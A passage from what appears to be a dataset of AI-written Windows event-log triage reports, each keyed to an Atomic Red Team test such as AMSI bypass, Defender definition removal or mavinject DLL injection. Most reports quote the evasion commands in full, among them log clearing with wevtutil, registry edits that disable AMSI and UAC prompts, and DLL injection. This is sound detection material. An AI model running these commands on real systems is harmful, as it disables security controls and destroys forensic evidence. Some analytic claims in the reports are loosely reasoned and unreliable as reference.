   - **PowerShell Logs (Event ID 600):** The PowerShell was executed using the `updater.exe` application, which is stored in the AppData Roaming directory, a known technique for hiding malicious scripts. Further, the command executed is `-Command exit`, suggesting that the script was likely a placeholder for more elaborate actions to evade detection.

3. **Unauthorized Copy Operations:**
   - **Sysmon Event (Event ID 1):** There's a suspicious command being executed: `cmd.exe /c copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe` which copies PowerShell to an unusual location and renames it as `updater.exe`. This is a notable indicator of attempted persistence or evasion by masquerading a trusted executable.

4. **Sysmon Events Involving Command Line Utility:**
   - **Process Execution of `wevtutil.exe`:** `wevtutil` was used to clear the logs ('cl' argument), confirming the suspicious log-clearing activities initiated by the `admin_test` user within the Sysmon logs. This is further corroborated by the command lines associated with these actions.

5. **Overall Contextual Analysis:**
   - The combination of log clearing activities, unusual execution and renaming of PowerShell executable, and the specific user's involvement in these actions suggest that there was intentional malicious behavior by `admin_test`.

### Threat Assessment

Based on the presented logs, the actions of the user `admin_test` strongly correlate with efforts to obfuscate and persist unauthorized activities. The activities suggest:

- **Persistence Techniques**: Attempts to establish persistence through renaming PowerShell in a directory not commonly monitored (`AppData\Roaming`).
- **Obfuscation Efforts**: Multiple occurrences of log file clearing efforts imply an intent to remove traces of any unauthorized activity.

### Guidance on How to Proceed

1. **Immediate Response:**
   - Isolate the involved host (`Server002`) from the network to prevent any further potential malicious activities.
   - Conduct a thorough forensic analysis on the machine, particularly focusing on the actions and files concerning the `admin_test` user's profile and any executables under `AppData\Roaming`.

2. **Investigation:**
   - Retrieve and preserve any available unedited logs from centralized logging if available.
   - Investigate other occurrences on the network of `updater.exe` or similar unauthorized PowerShell usage.

3. **Remedial Steps:**
   - Start preparing for potential rebuild and redeployment of affected systems.
   - Review and update security protocols, focusing on audit and logging policies ensuring resilience against similar threats.

### Resolution

Given the analysis, the activities observed in these logs are conclusively **MALICIOUS**. The combination of log tampering, suspicious process execution, and unauthorized file operations align with common attack patterns targeting persistence and evasion. Immediate action is advised to mitigate the potential impact on the network and associated systems."
AMSI Bypass - Create AMSIEnable Reg Key,"### Detailed Analysis:

**Suspicious or Anomalous Behavior:**

1. **PowerShell Log Activities:**

   - The PowerShell logs show multiple instances of the `New-Item` and `New-ItemProperty` cmdlets being used to modify registry settings under `HKCU:\Software\Microsoft\Windows Script\Settings`, specifically affecting `AmsiEnable` and setting its value to 0. Disabling AMSI (Antimalware Scan Interface) could be an attempt to evade antivirus or detection technologies. This is a well-known technique used by attackers.

   - The command executing these actions is from the PowerShell console host, which may indicate manual execution. The modifications are directed at user-level registry keys which may imply an attempt at persistence or a preliminary trial run of a script by an attacker lacking system privileges.

2. **Security and Sysmon Logs:**

   - The Sysmon logs indicate the usage of `wevtutil` to clear event logs. This is done by a user `admin_test`. Clearing of event logs, especially by methods like `wevtutil`, is a common technique used to cover tracks after malicious activity.
   
   - Specifically, the Security log event with ID 1102 indicates that the security logs were cleared, which could be indicative of an attempt to hide malicious activity.
   
   - Additional log entries indicate `wevtutil` being used multiple times, possibly targeting multiple logs, which further supports the assessment of track-covering behavior.

3. **Time Change Events:**

   - There are events showing time changes on the system (EventID 4616 in Security logs and various entries in System logs). Time manipulation can sometimes be indicative of an attacker attempting to disguise the temporal sequence of activities or using time as a trigger mechanism.

4. **Microsoft Edge Update:**

   - Multiple events are related to legitimate Microsoft Edge update processes. While not directly suspicious, any unrelated or misaligned versions or unexpected schedules should be further validated against known update schedules to rule out potential misuse of legitimate binaries.
   
**Assessment:**

Given the above observations, particularly the disabling of AMSI and clearing of event logs, there are clear indicators of potential malicious activity on the system. Such actions typically indicate an attempt to conduct malicious operations covertly.

**Threats or Risks Identified:**

- Potential persistence or preparatory steps for executing further malicious actions.
- Attempts to disable security mechanisms and evade detection.
- Possible unauthorized data exfiltration or system compromise.
- Consequences of successful execution might include system instability, data loss, or a foothold for further attacks.

**Guidance on How to Proceed:**

- **Immediate Steps:**
  - Isolate the affected system to prevent potential spread.
  - Conduct a detailed forensic analysis using additional endpoint monitoring tools to assess further impacts and scope.
  - Appropriately backup current logs and system configurations for future reference and investigation.

- **Long-Term Recommendations:**
  - Review and reinforce security policies, especially around PowerShell execution policies and use of administrative tools.
  - Implement more robust logging, monitoring, and alerting mechanisms.
  - Consider a review of user activity and privileges, particularly for `admin_test`.

### Final Resolution: MALICIOUS

The activities observed, particularly disabling security features, and clearing logs, strongly indicate malicious actions occurring on the system. Further investigative and containment measures should be prioritized immediately."
UACME Bypass Method 33,"**Detailed Analysis of Logs:**

The provided logs from a Windows host display several activities across different logging frameworks, mainly System, Application, Security, and Sysmon logs. Here’s a detailed analysis:

### Indicators of Malicious Activity:

1. **Event Log Clearing:**
   - **System EventID 104:** Indicates that event logs related to the System and Windows PowerShell were cleared by the user `admin_test`. This action could be suspicious if not conducted as part of routine administrative tasks, as malicious actors often clear logs to erase traces.

   - **Security EventID 1102:** Indicates that the security log was cleared by the same user, `admin_test`. This is typically a clear indicator of suspicious activity because attackers may clear logs to hide their tracks.

2. **Process Execution:**
   - **Sysmon EventID 1:** A process `cmd.exe` is executed with command-line arguments involving `Akagi64.exe`, a known UAC (User Account Control) bypass tool, raising suspicions about privilege escalation attempts.

   - **Multiple executions of `wevtutil.exe`:** This executable is utilized to clear event logs, as observed in the command lines associated with processes executed by `admin_test`. 

3. **Privileged Operations:**
   - **Security EventID 4672:** The account `SYSTEM` was granted special privileges, including `SeDebugPrivilege`, which is commonly used by attackers for privilege escalation or to tamper with system processes.

4. **Credential Access Operations:**
   - **Security EventID 5379:** Failed credential validation attempts for the user `02txoixylodcstop`, which might suggest attempted unauthorized access or probing for existing accounts.

### Assessment:

The combination of log clearing activities, execution of known exploit tools, and processes associated with elevated privileges align with typical behaviors observed during or following a security compromise. Although there are legitimate operations common in systems like Edge Update occurring, the timing and context in which these events take place seem typical of a cover-up following unauthorized access or privilege escalation attempts.

### Final Resolution:

- **MALICIOUS**: The collected data and behavioral patterns reflect characteristics typical of a compromised host attempting to perform illicit activities while covering tracks by clearing logs. The use of potential exploit tools, like `Akagi64.exe`, further supports this conclusion.

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Isolate the affected host from the network to prevent lateral movement.
   - Conduct a thorough investigation to identify how the breach occurred and other possibly affected systems.
   - Change all potentially compromised passwords, especially those with administrative privileges.

2. **Remediation and Hardening:**
   - Restore from backup or rebuild the system to ensure all malicious artifacts are removed.
   - Regularly update and patch all software to protect against known vulnerabilities.
   - Implement stricter access controls and monitor for suspicious activities.

3. **Monitoring and Follow-up:**
   - Increase logging and monitoring of critical systems.
   - Conduct a comprehensive audit of all user activities and system configurations, focusing on compliance with security best practices.

These steps are crucial in mitigating the immediate threat and securing the system against future attacks."
Disable Windows Security Center Notifications,"Upon reviewing the provided Windows event logs, several activities stand out that indicate potential malicious behavior or compromise:

1. **Use of `wevtutil.exe`**: The frequent invocation of `wevtutil.exe` to clear event logs (indicated by command line `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, and `cl “Windows PowerShell”`) is highly suspicious. This action is commonly associated with attackers attempting to cover their tracks, as clearing logs can erase evidence of malicious activities.

2. **Clearing of Event Logs**: 
   - Security Log (Event ID 1102): The event logs show that the security log was cleared. This is typically an action that administrators would perform during maintenance under carefully logged conditions, but in this context, it is suspicious especially since other logs were cleared shortly after.
   - System and PowerShell Logs: Also show signs of being cleared (Event ID 104). The clearing of multiple log files is anomalous and suggests an attempt to hide actions performed on the system.

3. **Manipulation of Registry Settings via `cmd.exe` and `reg.exe`**: The execution of a command to add a registry key (`reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell`) is a potentially malicious activity that could be used for persistence or modification of system behavior.

4. **Use of High Integrity Levels**: Many of the commands were executed with high integrity levels, indicating they were run with administrative privileges. Together with the privilege escalation event (Event ID 4672) that includes privileges like `SeDebugPrivilege` and others, this may suggest an unauthorized elevation of privileges.

5. **Chain of Process Invocations**: The pattern of process creation where benign-looking utilities (like `whoami.exe`, `hostname.exe`, `reg.exe`) are invoked rapidly could imply scripting or automation, often seen in malicious exploitation activity.

Based on the logs and the noted activities, the resolution for this analysis is:

- **MALICIOUS**: The combination of processes used for log clearing (with `wevtutil.exe`), registry modifications, and execution with elevated privileges strongly indicates the presence of malicious activity on this Windows host. It suggests an attempt to hide unauthorized changes and potentially establish persistent access.

### Guidance to Proceed:
1. **Immediate Steps**: 
   - Isolate the system to prevent further spread or damage.
   - Conduct full malware and integrity scans to identify any malicious software or unauthorized changes.
   - Preserve logs and create a forensic image of the system for further analysis.

2. **Further Investigation**:

   - Verify via logs and other sources whether unauthorized users have accessed the system.
   - Review any recent changes to system configurations or installed software.

3. **Preventive Measures**:
   - Strengthen logging and monitoring configurations to ensure that suspicious log clearing attempts are flagged and investigated immediately.
   - Implement stricter access controls and privilege management to prevent abuse of administrative privileges."
Remove Windows Defender Definition Files,"Upon reviewing the provided Windows event logs, there are several indicators that could potentially signify malicious activity:

1. **Repeated Use of `wevtutil.exe`**: 
   - The Sysmon logs show frequent use of `C:\\Windows\\System32\\wevtutil.exe` to clear various logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security`) by the `admin_test` account. Using `wevtutil.exe` to manipulate event logs may indicate an attempt to cover activity tracks, which is a known tactic used by attackers.

2. **Windows Defender Configuration Manipulation**: 
   - There are entries where `cmd.exe` executes `MpCmdRun.exe` with the `-RemoveDefinitions -All` switch. This removes all definitions from Windows Defender, effectively disabling its ability to detect threats using existing definitions. This could signify a deliberate effort to weaken the host's security posture.

3. **Log File Clearing**:
   - Event logs are being cleared (`EventID: 104` and `EventID: 1102`). This activity generally implies potentially malicious intent, as adversaries often clear logs to remove evidence of their actions.

4. **Execution of `whoami.exe` and `hostname.exe`**:
   - These commands are commonly used during reconnaissance to gather system and user information. However, on their own, they are not definitive indicators of malicious activity, but they do contribute to a potentially malicious pattern when coupled with other indicators.

**Assessment**:
- The combination of actions such as clearing event logs, disabling Windows Defender definitions, and repeated use of administrative utilities strongly suggest attempts to mask nefarious activities.

**Risks Identified**:
- The system appears to be compromised, with actions taken to impede detection (e.g., disabling Windows Defender).
- The individual using the `admin_test` account is likely attempting unauthorized system changes and potentially preparing for further unauthorized actions.

**Recommendation**:
- Immediately review the active user sessions and credentials, particularly the `admin_test` account. 
- Investigate logs and actions preceding the provided events to uncover the entry point or initial compromise.
- Strengthen monitoring on similar activities across the network environment and implement alerts for the use of utilities like `wevtutil.exe` and `MpCmdRun.exe`.
- Consider isolating or further securing the implicated host to prevent further unauthorized activities.
- Conduct a thorough incident response investigation to determine the full scope and potential impact of the activities.

**Resolution**: MALICIOUS - The activities logged indicate attempts to cover tracks and disable security measures, consistent with malicious behavior."
Install root CA on Windows with certutil,"After reviewing the provided logs, here's a detailed analysis of the events:

### Analysis of Suspicious Activities:
1. **Log Clearing Events:**
   - **System Log (EventID 104):** There are two events indicating that logs were cleared from the System and Windows PowerShell channels by a user named `admin_test` on `Server002`. Log clearing can be benign in certain administrative contexts but can also indicate an attempt to cover up malicious activity.
   - **Security Log (EventID 1102):** The Security log was cleared by `admin_test`. This is typically considered suspicious as it's often a step attackers take to hide activities.

2. **Command Execution with Elevated Privileges:**
   - **Sysmon Logs (EventID 1):** Multiple instances of `wevtutil.exe` were executed to clear logs from various channels. The command line seen executing “cl” (clear) commands for System, Security, and Windows PowerShell logs could suggest an attempt to erase traces of activity.

3. **Use of PowerShell and CertUtil:**
   - A PowerShell command was issued to add a certificate store using `certutil`. PowerShell is often used in both administrative functions and attacks to execute scripts without writing them to disk. The use of `certutil` to add certificates can be indicative of a variety of attacks, including establishing trust for malicious binaries and exfiltration of data disguised as certificates.

4. **Suspicious Timing and Context of Activities:**
   - The timing of the commands (log clearing close to PowerShell and certutil execution) and the use of elevated privileges add suspicion. There were continuous launches of processes related to administrative tasks executed in rapid succession, which is not characteristic of routine administrative operations.

5. **Indicators in Security Logs:**
   - Event ID 4672, which indicates special privileges being assigned, can be normal; however, its presence amidst other suspicious events could suggest privilege escalation.

### Assessment:
The combination of log clearing, use of PowerShell with potentially nefarious commands, and the execution of system utilities in rapid succession strongly points toward malicious activity. 

### Recommendation:
- **Resolution: MALICIOUS.** The presented logs suggest deliberate attempts to obfuscate actions and potentially achieve unauthorized goals using legitimate tools under the guise of administrative tasks. Immediate steps should include:
  - Performing a thorough security incident investigation.
  - Ensuring the affected systems are isolated to prevent further damage.
  - Restoring logs from backups, if available, and analyzing them for additional traces of compromise.
  - Reevaluating the security policies for log management and command execution.
  - Reviewing and fortifying user privilege policies."
Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key,"Upon reviewing the provided event logs, several points stand out that suggest potentially malicious activity:

1. **Event Log Clearing**: 
   - Multiple entries indicate that event logs were cleared on the system:
     - System log (Event ID 104), Security log (Event ID 1102), and Windows PowerShell log have entries showing logs were cleared by the user `admin_test`. 
     - The command lines for clearing logs used `wevtutil.exe`, which is commonly used to clear event logs. This is suspicious because clearing logs can often be an attempt to cover up malicious activity.

2. **PowerShell Activity**:
   - The PowerShell logs show a script execution that modifies a registry key (`ConsentPromptBehaviorAdmin`) related to User Account Control (UAC) settings:
     - The script sets `ConsentPromptBehaviorAdmin` value to 0. This action could be used to weaken UAC, potentially facilitating privilege escalation.
   - The use of registry changes via PowerShell without clear documentation or authorization can be considered suspicious.

3. **Process Execution**:
   - The Sysmon logs contain records of processes like `wevtutil.exe` and `PowerShell.exe` being executed by `admin_test`. These command-line tools are often leveraged in attacks for log removal, scripting, and configuration changes.

4. **Unnecessary System Commands**:
   - The execution of commands like `whoami.exe` and `hostname.exe` may not be inherently malicious, but they are sometimes used in the enumeration phase of an attack to gather information about the current user and system.

5. **Potentially Unusual Network Connections**:
   - There is an indication of a time synchronization with `time.windows.com`. While this may be normal, if this machine is part of a domain environment, time synchronization would typically be handled by the domain controller. Further investigation would be required to confirm if this is normal for the target environment.

**Assessment and Recommendations**:

- **Resolution**: **MALICIOUS**

The combination of log clearing, registry modifications to weaken UAC, PowerShell scripting activity, and usage of system command-line tools for potentially unauthorized purposes suggests that this system may have been compromised.

To proceed, I recommend the following actions:
- Conduct a detailed forensic analysis to understand the extent of the compromise.
- Review access logs and network traffic for lateral movement or data exfiltration activities.
- Check for similar indicators on other systems within the network.
- Apply stricter monitoring and logging policies, ensuring alerts for key activities like privileged user actions and log clearing.
- Consider resetting credentials for the `admin_test` account or any affected user accounts.
- Update and patch all systems to the latest security fixes. Consider strengthening PowerShell logging to capture script blocks and enhance endpoint detection capabilities."
Modify Registry of Current User Profile - cmd,"After thoroughly analyzing the provided Windows event logs, here are the key observations:

1. **Clearing of Event Logs:**
   - Event log entries indicate that the security and system logs were cleared by a user with the username ""admin_test"". The clearing of logs is recorded in both security and system logs with EventID 1102 and 104, respectively. This action is highly suspicious as legitimate users rarely clear event logs. It's a common tactic used by malicious actors to cover their tracks.

2. **Use of `wevtutil` Command:**
   - Several Sysmon logs capture the use of `wevtutil.exe` with command line arguments for clearing various logs (e.g., Microsoft-Windows-Sysmon/Operational, Application, System, Security, and Windows PowerShell logs). The `wevtutil cl <log_name>` command is specifically used to clear event logs.

3. **Registry Modification:**
   - A command is executed via `cmd.exe` to modify the Windows registry to change settings related to file explorer using `reg.exe`. The command `reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f` hides file extensions for known types, which is suspicious as malware often hides extensions to obfuscate payloads.

4. **High Integrity Processes:**
   - Many of the processes, including `wevtutil.exe` and registry modifications, are launched with high integrity, which indicates they were executed with administrative privileges. This could indicate privilege escalation or that a user with administrator rights is conducting these operations maliciously.

5. **Common Malicious Indicators:**
   - The combination of actions observed is characteristic of a potential compromise or malicious activity: clearing event logs to erase traces, modifying system settings, and executing privileged processes without clear legitimate reasons.

Based on these observations, I conclude that this activity is consistent with a compromise of the system or the presence of malicious actions. The logs present strong evidence of suspicious behavior aimed at hiding traces and potentially configuring the system for further unauthorized activity.

**Resolution:** MALICIOUS

**Guidance on how to proceed:**
- Immediately isolate the affected host (Server002) from the network to prevent further malicious activity.
- Conduct a full forensic investigation on the host to identify any malicious software, backdoors, or additional changes made to the system.
- Review user accounts and privileges to ensure no unauthorized changes have been made.
- Restore affected systems from known good backups to ensure integrity.
- Ensure event logging is functioning correctly post-incident and monitor for any additional suspicious activities.
- Review and strengthen security measures and policies to mitigate future incidents."
Renamed Microsoft.Workflow.Compiler.exe Payload Executions,"Upon analyzing the provided Windows event logs, the following points of interest have been identified:

1. **Log Cleared Events**: 
   - Multiple `wevtutil.exe` commands were executed to clear logs (`cl` flag) for Security, System, and Windows PowerShell logs. This is indicated by multiple Sysmon Event ID 1 and 5 entries for processes with images `wevtutil.exe`. Clearing of logs itself can be suspicious, especially when done without prior notification, as it may indicate an attempt to cover tracks after performing potentially malicious activities.

2. **Windows PowerShell Activity**:
   - There are several PowerShell executions with an uncommonly structured command line that involves executing what seems to be an anomalous payload: a file under `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\\ExternalPayloads\\svchost.exe`. The use of PowerShell in such a way, combined with the suspicious file path and potential evasion technique, suggests malicious activity.

3. **Credential Access and Failed Target Access**:
   - Event ID 5379 indicates attempts to access credentials or tokens for several Windows Live services and Microsoft accounts with return code `3221225567` (STATUS_OBJECT_NAME_NOT_FOUND), indicating failed attempts. The presence of these events could indicate attempts to access unauthorized resources or a brute force attempt.

4. **Service Execution and Monitoring**:
   - The `svchost.exe` in `C:\Users\ADMIN_~1\AppData\Local\Temp\ExternalPayloads\` appears to be an unusual location for such a system-critical application, suggesting it was potentially used for malicious purposes.
   - There are corresponding application log entries indicating termination of the process due to an unhandled exception in `svchost.exe`.

5. **Presence of Atomic Red Team Artifacts**:
   - The presence of `AtomicRedTeam` paths suggests that the system may have been subjected to penetration testing or simulated attack exercises, potentially indicating either testing of TTPs (Tactics, Techniques, and Procedures) or a mimicking attack using the Atomic Red Team framework.

Based on the evidence within the logs indicating unusual and likely unauthorized log activities, suspicious PowerShell usage linked to potential payload execution, and anomalous behavior typically associated with malicious activities, I will conclude with the following resolution:

- **Resolution: MALICIOUS**

### Recommendations:
1. Conduct a full forensic analysis to understand the extent and nature of the malicious activity.
2. Review and enhance logging and monitoring to better detect such behaviors in the future.
3. Investigate the source of the `svchost.exe` and related files under `ExternalPayloads`.
4. Ensure any testing frameworks (e.g., Atomic Red Team) or their artifacts are appropriately managed and removed if unauthorized or unnecessary.
5. Perform a security audit on accounts and privileges, focusing on accounts involved in the activities (e.g., `admin_test`). Reset passwords and check for unauthorized account usage."
Masquerading - non-windows exe running as windows exe,"Based on the provided logs, several events stand out as potentially indicating suspicious or malicious activity:

### Windows PowerShell Logs:
1. **Repeated Execution of PowerShell Script**:
   - Logs indicate a PowerShell script was run using `powershell.exe`, with an operation which resembles an attempt to rename a file to `svchost.exe`. This, along with operations to start and then stop a process, is indicative of an attempt at masquerading – a common technique used by malware.

### Security Logs:
2. **Event Log Clearance**:
   - The security event log indicates that logs were cleared (EventID 1102) by the user `admin_test`. Log clearance is a known practice to cover tracks following unauthorized activities.

### System Logs:
3. **Event Log Clearance**:
   - Similar to the security log, the system log indicates that log files were cleared, which further suggests an attempt to hide activities on the system.

### Sysmon Logs:
4. **Execution of Suspicious Processes**:
   - Multiple instances of `wevtutil.exe` (Eventing Command Line Utility) running with `cl` (clear logs) as an argument indicates that the logs were cleared using this utility.
   - The execution of a PowerShell command line involving copying and execution of a .exe file (indicative of a potentially malicious .exe) corroborates PowerShell logs, suggesting unauthorized activities may be in play.
   - Execution of `whoami.exe`, `hostname.exe`, and other enumeration commands indicate potential recon activity.

### Assessment:
- **Indicators of Privilege Escalation**: The presence of logon events such as `4624` (successful logon) with elevated privileges (`4672`) hint at possible privilege escalation.

- **Unusual Executions and Contexts**: The use of certain executables, particularly in administrative contexts, and the repeated validation of credentials, suggest an anomaly in account use behavior.

- **Digital Forensics Evidence**: 
  - The logs contain evidence of actions aimed at covering tracks (log clearing).
  - There are attempts to execute suspicious scripts, potential privilege escalation, and obfuscation via process name changes.

### Conclusion:
Given the evidence of potentially malicious PowerShell activity, log clearing efforts, and other suspicious behaviors, the situation warrants serious investigation. While it's not definitively confirmed that these actions were malicious, they are strongly indicative of unauthorized and potentially harmful actions on the system. Further investigation, particularly in reviewing file integrity, analyzing the malicious `.exe` file, and corroborating user activities, is necessary to confirm and mitigate any threats.

### Resolution: 
- **SUSPICIOUS** - The logs display activity that doesn't look right and warrants further investigation. Immediate action should involve isolating the system, conducting a thorough malware analysis, and checking for system integrity while ensuring the investigation into the user account activities is initiated."
Modify UseTPM Registry entry,"Upon analyzing the provided Windows event logs, several indicators of potentially suspicious or malicious activity were identified:

1. **Event Log Clearing**:
   - The repeated use of `wevtutil.exe` to clear logs across various channels (System, Security, Windows PowerShell, and Microsoft-Windows-Sysmon/Operational) is particularly concerning. This behavior is often associated with attempts to cover tracks following unauthorized or malicious activity.

2. **Privileged Command Execution**:
   - The execution of `cmd.exe` and `reg.exe` with commands to modify registry keys related to BitLocker (`HKLM\SOFTWARE\Policies\Microsoft\FVE`) without clear legitimate context raises concerns. Registry modifications, especially involving system-level configurations, can be indicative of attempts to weaken system security or establish persistence.

3. **Use of Administrative Accounts**:
   - The activities were carried out under the `admin_test` user account with high integrity levels, suggesting administrative privileges were utilized. This could indicate a potential privilege escalation or misuse of legitimate credentials.

4. **No Direct Indicators of Exploit or Malware**:
   - While the Sysmon logs show various processes related to Microsoft Edge Update, there is no direct indication these updates are malicious. However, the clearing of logs related to these processes adds a layer of suspicion.

**Conclusion**:
Given the deliberate clearing of event logs and the execution of potentially security-impacting commands, the summarized activities in the logs could be indicative of threat actor activity, aiming to obscure unauthorized changes or actions. It is recommended that these activities be treated as SUSPICIOUS and warrant further investigation to understand the context and intent, and also validate whether these actions align with expected administrative tasks or policies.

**Guidance**:
1. Conduct a thorough investigation into the user `admin_test`—verify the legitimacy of account activity and check for possible compromise.
2. Analyze system changes and communications around the timeframe of these events to identify potential entry points or further unauthorized actions.
3. Consider deploying or enhancing endpoint detection and response solutions to monitor for similar behaviors across the network.
4. Review the system for additional signs of tampering, potential backdoors, or unrecognized scheduled tasks or services."
Disable UAC - Switch to the secure desktop when prompting for elevation via registry key,"Based on the analysis of the provided event logs, several indicators suggest suspicious or potentially malicious activity. Here's a detailed breakdown of the findings:

1. **PowerShell Activity:**
   - A PowerShell command was executed to modify the registry key `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0`. This command disables the secure desktop feature for User Account Control (UAC), which can be a tactic used by attackers to escalate privileges or bypass security prompts. Such actions are typically considered suspicious unless sanctioned by administrators for specific troubleshooting or configuration changes.

2. **Sysmon & System Activity:**
   - Several instances where `wevtutil.exe` and `conhost.exe` were executed with privileges. Wevtutil is often used to clear event logs, and indeed, logs are being cleared. The combination of using wevtutil to access log details and the evidence of log clearance by the user `admin_test` suggests potential log tampering or covering of tracks, a common post-exploitation activity.
   - The user `admin_test` executed actions which cleared the Security and System event logs. Clearing logs is a critical indicator of malicious activity as it is designed to remove traces of an attack.

3. **Software Installation or Update:**
   - The Sysmon logs show frequent executions of Microsoft Edge Update-related processes, often seen as regular activity. However, when combined with other suspicious behaviors, it leaves open potential for malicious actors hiding their activities behind legitimate update processes.

4. **Security Log Clearance:**
   - There are specific logs indicating the security logs were cleared by the user `admin_test`. This activity should raise immediate concern and typically indicates attempts to hide unauthorized actions. Normal user behavior typically does not include such activities without proper change management documentation or admin tasks.

**Assessment:**
- **SUSPICIOUS:** The presence of registry modifications via unauthorized or unexpected PowerShell execution, combined with the clearing of event logs by a user, strongly suggests suspicious activity. While there isn't definitive proof of malware or direct exploitation, these actions warrant further investigation to rule out malicious intent or compromise.

**Resolution Guidance:**
- Conduct a thorough forensic analysis of the machine `Server002` to identify any further indicators of compromise or malicious binaries.
- Review user `admin_test` activities and access to determine if these actions were legitimate or unauthorized.
- Implement stronger monitoring and logging to capture more detailed PowerShell activity and enforce stricter access controls.
- Verify that similar suspicious activities or patterns do not occur on other systems within the network.

It is essential to follow up with a more detailed investigation, including interviewing personnel, reviewing change management records, and potentially increasing the alert level within the network monitoring infrastructure."
mavinject - Inject DLL into running process,"Upon reviewing the provided Windows event logs, I have identified several key points of interest:

1. **Log Clearing Events**:
   - There are multiple log clear events observed. Specifically, security log (Event ID 1102), system log, sysmon, and application log clear events are noted. 
   - The logs were cleared by the user ""admin_test"" on Server002. It's generally uncommon for logs to be cleared during an investigation timeframe unless there's an intended purpose with approval. This can be a technique used by malicious actors to delete forensic evidence.

2. **Process Execution and Command-Line Activity**:
   - A suspicious command via `cmd.exe` is observed involving `mavinject.exe`, with the intention to inject a DLL (`T1218.dll`) into a running process. The command is `cmd.exe /c mavinject.exe 1000 /INJECTRUNNING ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218\\src\\x64\\T1218.dll""`.
   - This activity is highly indicative of a process injection attempt, which is a known technique used by attackers to execute code within the address space of another process.

3. **Sysmon Logs**:
   - The frequent execution of the command `wevtutil.exe cl <various log names>` by the `admin_test` user indicates the logs were repeatedly cleared manually, which complements the security log clear events mentioned above.
   - Various execution of legitimate tools such as `whoami.exe`, `hostname.exe`, and `powershell.exe` by the same account could indicate exploration of system information and potential preparation for further malicious activity.

4. **Network Service Activity**:
   - Processes such as `sppsvc.exe`, `WmiPrvSE.exe`, `TiWorker.exe`, and `TrustedInstaller.exe` running under `NT AUTHORITY` are typically benign for system operational tasks, but need to be watched if occurring around the time of suspect activity.

5. **Edge Update Activity**:
   - Edge Update activity is observed, however, there are multiple instances running from different directories including temporary paths. While these could be part of legitimate update processes, they also might need further scrutiny for persistence techniques or unintended side effects given the suspicious timing.

### Assessment:
Given the combination of log clearing activities, command-line execution indicating process injection, and the context of account usage, there are definitive signs of potential malicious activity. The nature of the activity requires a thorough investigation to corroborate these findings with network traffic logs, endpoint detection, and response solutions, as well as potentially analyzing the DLL involved in the injection attempt.

### Resolution:
- **MALICIOUS**: The presence of events attempting to clear logs combined with evidence of DLL injection commands heavily indicate malicious actions intentionally designed to execute with stealth and persistence.

### Guidance to Proceed:
1. Investigate further to determine the origin and intent of the identified process injection attempts.
2. Examine the integrity and activities of the user account ""admin_test"" for unauthorized access or privilege escalation.
3. Validate whether the processes running from the temporary directories related to Edge Update are part of legitimate update actions or an indicator of compromise.
4. Increase monitoring and consider isolating the system until full forensic analysis can be completed to prevent lateral movement or additional compromise. 

Further coordination with incident response and possibly involving cyber threat intelligence teams may also be advised."
Add Network Share,"### Detailed Analysis of the Logs

**1. Log Clearing Events:**

- **System Log Clearing:**
  - The logs show multiple `EventID 104` events, indicating that the event logs, including the System and Windows PowerShell logs, were cleared by the user `admin_test`. This might indicate an attempt to cover tracks after performing suspicious or malicious operations.
  
- **Security Log Clearing:**
  - An `EventID 1102` was observed, indicating that the Security log was cleared by the same user `admin_test`. Clearing Security logs is particularly suspicious as it suggests an attempt to hide unauthorized activities.

**2. Process Execution:**

- **System Tools and Utilities Usage:**
  - Several executions of Windows system utilities like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` are logged, but these are standard tools. However, their execution context and the fact they follow log-clearing activities can be suspicious if not adequately justified.

- **Usage of `wevtutil.exe`:**
  - The `wevtutil.exe` command, which was used to clear logs, is commonly used by attackers post-compromise to hide their tracks by clearing event logs which were precisely observed.

- **`cmd.exe` and `net.exe` Usage:**
  - Observations show the execution of `cmd.exe` with commands involving network shares (`net use` and `net share`). Such activities could be suspicious as they might aim for lateral movement or exfiltration, mainly if they are not part of routine operations on this server.

**3. Sysmon Logs:**

- The Sysmon logs indicate the execution of several processes related to system utilities, but the critical observations in these events are their context and the sequence after log clearing activities. 

**4. Time Synchronization Events:**

- Multiple `EventID 4616` security audit events related to time change by `svchost.exe` as a part of the Windows Time Service are normal when the system is synchronizing its time. No direct indication of compromise is inferred from these events.

### Assessment

Based on the logs provided, the following suspicions have been identified:
- The multiple log clearing events are strong indicators of potential malicious activity aimed at covering tracks.
- The use of system commands/tools and creating network shares is suspicious when correlated with the log clearance. It may indicate lateral movement or preparation for data exfiltration.
- The operation of `wevtutil.exe` with the command line arguments provided is typically a method used in attack scenarios to clear logs.

### Conclusion

- **Resolution: MALICIOUS**

The activities observed in the logs strongly indicate malicious intent, with evidence pointing towards unauthorized and potentially harmful actions:
- The clearing of different log types (System, Security, and Windows PowerShell) suggests an attempt to remove evidence of potentially malicious activities.
- The contextual use of various command-line tools in rapid succession without corresponding benign rationale points towards post-exploitation behaviors.

### Guidance on How to Proceed

1. **Immediate Action:**
   - Isolate the affected machine immediately to prevent any ongoing compromise or exfiltration of data.

2. **Further Investigation:**
   - Conduct a detailed forensic analysis of the machine, searching for further indicators of compromise, and correlate with network logs to identify any related suspicious activities.

Create Windows Hidden File with Attrib,"After analyzing the provided logs from the Windows host, several indicators suggest potential malicious activity and warrant further investigation. Here's a detailed breakdown of the findings:

1. **Log Clearing Activity**:
   - System Event Logs with Event ID 104 were generated when the logs were cleared, which is suspicious, especially when combined with Security Log Event ID 1102 indicating that the Security logs have also been cleared. This activity was performed by the user ""admin_test,"" which could indicate an attempt to cover up malicious actions.

2. **Suspicious Process Executions**:
   - There are multiple instances of `cmd.exe` and `conhost.exe` being executed with command-line arguments that are typically associated with script execution and potential command and control (C2) operations.
   - Notably, suspicious use of `cmd.exe` to create and hide temporary files (`T1564.001.txt`) using `attrib.exe` to set the hidden attribute, which can be indicative of the MITRE ATT&CK technique T1564.001 (Hide Artifacts: Hidden Files and Directories).

